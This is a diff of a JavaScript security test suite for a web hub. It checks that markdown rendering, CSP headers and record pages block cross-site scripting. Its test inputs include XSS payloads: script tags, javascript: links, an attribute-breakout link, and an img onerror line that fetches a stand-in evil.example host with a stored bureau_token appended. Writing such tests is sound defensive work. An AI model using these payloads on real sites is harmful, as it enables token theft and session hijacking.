@@ -70,7 +70,7 @@ function rawRequest(port, text) {
 }
 const stop = async (h) => { h.proc.kill('SIGKILL'); await sleep(100); };
 const within = (ms, fn) => { const t0 = process.hrtime.bigint(); const r = fn(); return { ms: Number(process.hrtime.bigint() - t0) / 1e6, r, ok: Number(process.hrtime.bigint() - t0) / 1e6 < ms }; };
-const STATIC = ['index.html', 'v2.html', 'office.html', 'office-assets.html', 'v2/styleguide.html', 'v2/media.js', 'v2/peek-panel.js', 'v2/awaiting-merge.js'];
+const STATIC = ['app/index.html', 'office.html', 'office-assets.html', 'app/hub-auth.js', 'app/work/parts.js', 'app/pages/mission.js', 'app/work/merge.js'];
 
 async function finding1() {
   console.log('1. a malformed request gets a 400 and the process lives');
@@ -92,19 +92,10 @@ async function finding1() {
 
 async function finding2() {
   console.log('2. markdown notes cannot run script; dashboards carry a CSP');
-  const src = fs.readFileSync(path.join(ROOT, 'hub/public/v2/brain-browser.js'), 'utf8');
-  const code = src.slice(src.indexOf('function renderMarkdown'), src.lastIndexOf('\n  }\n})();'));
-  const esc = (s) => String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
-  const render = new Function('esc', `${code}\nreturn renderMarkdown;`)(esc);
-  const out = render('# Note\n\n<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bureau_token)">\n\n- <script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n[bad2](http://x/" onmouseover="alert(1))\n\n**<b>x</b>**\n');
-  check('no live tag from note text', !/<(img|script|b)\b/i.test(out.replace(/<\/?(h1|ul|li|p|strong)>/g, '')), out);
-  check('no javascript: href', !/href="javascript:/i.test(out), out);
-  check('no attribute escapes the href', !/href="http:\/\/x\/"/.test(out), out);
-  const good = render('# Title\n\nSome **bold** and a [link](https://example.com/a__b__c) and [note](knowledge/x.md)\n');
-  check('real markdown still renders', /<h1>Title<\/h1>/.test(good) && /<strong>bold<\/strong>/.test(good) && /href="https:\/\/example\.com\/a__b__c"/.test(good) && /data-brain-link="knowledge\/x\.md"/.test(good), good);
+  await markdownCannotRunScript();
 
   const h = await boot('f2', 8202);
-  for (const route of ['/', '/v2', '/office', '/office/assets', '/v2/styleguide']) {
+  for (const route of ['/', '/index.html', '/missions', '/missions/t-1', '/goals', '/brain', '/brain/knowledge/x.md', '/projects', '/agents', '/activity', '/settings', '/sign-in', '/ds', '/office', '/office/assets']) {
     const r = await h.api('GET', route, undefined, { authorization: '' });
     const csp = r.headers.get('content-security-policy') || '';
     const nonce = (csp.match(/'nonce-([^']+)'/) || [])[1];
@@ -113,11 +104,72 @@ async function finding2() {
     check(`${route} inline scripts carry the nonce`, !!nonce && inline.every((m) => m[1].includes(nonce)), inline.map((m) => m[1]).slice(0, 3));
     check(`${route} connect-src stops other origins`, /connect-src 'self'/.test(csp) && !/connect-src[^;]*\*/.test(csp), csp);
   }
-  check('the v1 dashboard has no inline handlers left', !/\son[a-z]+="/.test(fs.readFileSync(path.join(ROOT, 'hub/public/index.html'), 'utf8')));
-  const t = (await h.api('POST', '/api/tasks', { title: 'x', project: 'general' })).json.task;
-  const page = await h.api('GET', `/m/${t.view_token}`, undefined, { authorization: '' });
-  check('a mission record page carries a CSP', /default-src 'none'/.test(page.headers.get('content-security-policy') || ''));
+  for (const route of ['/v2', '/v2/styleguide']) {
+    const r = await fetch(h.base + route, { redirect: 'manual' });
+    check(`${route} is a 301 to the Desk`, r.status === 301 && r.headers.get('location') === '/', { status: r.status, location: r.headers.get('location') });
+  }
+  for (const file of ['app/index.html', 'app/404.html', 'office.html', 'office-assets.html', 'omako-ds/README.md']) {
+    check(`${file} has no inline handler`, !/\son[a-z]+\s*=\s*["']/i.test(fs.readFileSync(path.join(ROOT, 'hub/public', file), 'utf8')));
+  }
+  const missing = await h.api('GET', '/no-such-page', undefined, { authorization: '' });
+  check('the HTML 404 carries the script-less CSP', missing.code === 404 && /default-src 'none'/.test(missing.headers.get('content-security-policy') || '') && !/script-src/.test(missing.headers.get('content-security-policy') || ''), missing.headers.get('content-security-policy'));
+  check('the HTML 404 has no script and no inline handler', !/<script\b/i.test(missing.text) && !/\son[a-z]+\s*=\s*["']/i.test(missing.text));
+
+  const hostile = '<script>alert(1)</script><img src=x onerror=alert(2)>';
+  const t = (await h.api('POST', '/api/tasks', { title: hostile, body: hostile, project: 'general', gate: 'critic' })).json.task;
+  await h.api('POST', '/api/agents/register', { name: 'sec-worker', kind: 'test' });
+  await h.api('POST', '/api/tasks/claim', { agent: 'sec-worker', id: t.id });
+  await h.api('PATCH', `/api/tasks/${t.id}`, { agent: 'sec-worker', note: hostile, artifact: { label: hostile, url: 'javascript:alert(3)' } });
+  await h.api('PATCH', `/api/tasks/${t.id}`, { agent: 'sec-worker', status: 'review', note: hostile, items: [{ title: hostile, body: hostile }] });
+  const parked = (await h.api('GET', `/api/tasks/${t.id}`)).json;
+  const approveToken = (parked.task || parked).review_links.approve.token;
+  const pages = { [`/m/${t.view_token}`]: 'a mission record page', [`/r/${approveToken}`]: 'a review page', '/r/00000000000000000000000000000000': 'a dead review link' };
+  for (const [route, label] of Object.entries(pages)) {
+    const page = await h.api('GET', route, undefined, { authorization: '' });
+    const csp = page.headers.get('content-security-policy') || '';
+    check(`${label} carries a CSP`, /default-src 'none'/.test(csp), csp);
+    check(`${label} is not allowed any script`, !/script-src/.test(csp), csp);
+    check(`${label} has no script tag`, !/<script\b/i.test(page.text), page.text.slice(0, 300));
+    check(`${label} has no inline handler`, !/<[^>]*\son[a-z]+\s*=/i.test(page.text.replace(/&lt;[^]*?&gt;/g, '')), page.text.slice(0, 300));
+    check(`${label} loads the design system from the hub`, /<link rel="stylesheet" href="\/omako-ds\/all\.css">/.test(page.text), page.text.slice(0, 300));
+  }
+  const record = await h.api('GET', `/m/${t.view_token}`, undefined, { authorization: '' });
+  check('mission text is escaped on the record page', record.text.includes('&lt;script&gt;alert(1)&lt;/script&gt;') && !record.text.includes('<script>alert(1)'), record.text.slice(0, 400));
+  check('an artifact url that is not http(s) is no link', !/href="javascript:/i.test(record.text), record.text.slice(0, 400));
   await stop(h);
+}
+
+// hub/public/app/markdown.js is an ES module, so its two files are copied to a
+// temporary folder marked as ESM and imported from there, as test/markdown.test.js does.
+async function markdownCannotRunScript() {
+  class StubNode {}
+  class Text extends StubNode { constructor(v) { super(); this.text = String(v); } }
+  class El extends StubNode {
+    constructor(tag) { super(); this.tag = tag; this.attrs = {}; this.kids = []; this.dataset = {}; this.props = {}; this.style = { setProperty() {} }; }
+    setAttribute(k, v) { this.attrs[k] = String(v); }
+    addEventListener(type) { this.listens = (this.listens || []).concat(type); }
+    append(...nodes) { this.kids.push(...nodes); }
+    replaceChildren(...nodes) { this.kids = nodes; }
+    set innerHTML(v) { throw new Error(`innerHTML assigned: ${v}`); }
+  }
+  globalThis.Node = StubNode;
+  globalThis.document = { createElement: (t) => new El(t), createElementNS: (_, t) => new El(t), createTextNode: (v) => new Text(v), createDocumentFragment: () => new El('#fragment') };
+  const dir = fs.mkdtempSync(path.join(SCRATCH, 'md-'));
+  fs.writeFileSync(path.join(dir, 'package.json'), '{"type":"module"}');
+  for (const f of ['markdown.js', 'dom.js']) fs.copyFileSync(path.join(ROOT, 'hub/public/app', f), path.join(dir, f));
+  const md = await import(require('url').pathToFileURL(path.join(dir, 'markdown.js')).href);
+
+  const walk = (node, seen = []) => { if (node instanceof El) { seen.push(node); node.kids.forEach((k) => walk(k, seen)); } return seen; };
+  const hostile = '# Note\n\n<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bureau_token)">\n\n- <script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n[bad2](http://x/" onmouseover="alert(1))\n\n**<b>x</b>**\n';
+  const els = walk(md.renderMarkdown(hostile));
+  check('no live tag from note text', !els.some((e) => ['script', 'b'].includes(e.tag) || (e.tag === 'img' && e.attrs.src === 'x')), els.map((e) => e.tag));
+  check('no event handler attribute from note text', !els.some((e) => Object.keys(e.attrs).some((a) => /^on/i.test(a))), els.map((e) => e.attrs));
+  check('no javascript: href', !els.some((e) => /^\s*javascript:/i.test(e.attrs.href || '')), els.map((e) => e.attrs.href).filter(Boolean));
+  check('text injected after an href stays text', !els.some((e) => /onmouseover/i.test(`${Object.keys(e.attrs).join(' ')} ${e.attrs.href || ''} ${e.attrs.title || ''}`)), els.map((e) => e.attrs));
+  check('safeHref refuses javascript:', !md.safeHref('javascript:alert(1)'), md.safeHref('javascript:alert(1)'));
+  check('safeHref keeps https', md.safeHref('https://example.com/a__b__c') === 'https://example.com/a__b__c', md.safeHref('https://example.com/a__b__c'));
+  const parsed = JSON.stringify(md.parseMarkdown('Some **bold** and a [link](https://example.com/a__b__c)\n'));
+  check('real markdown still parses', parsed.includes('bold') && parsed.includes('https://example.com/a__b__c'), parsed.slice(0, 300));
 }
 
 async function finding3() {
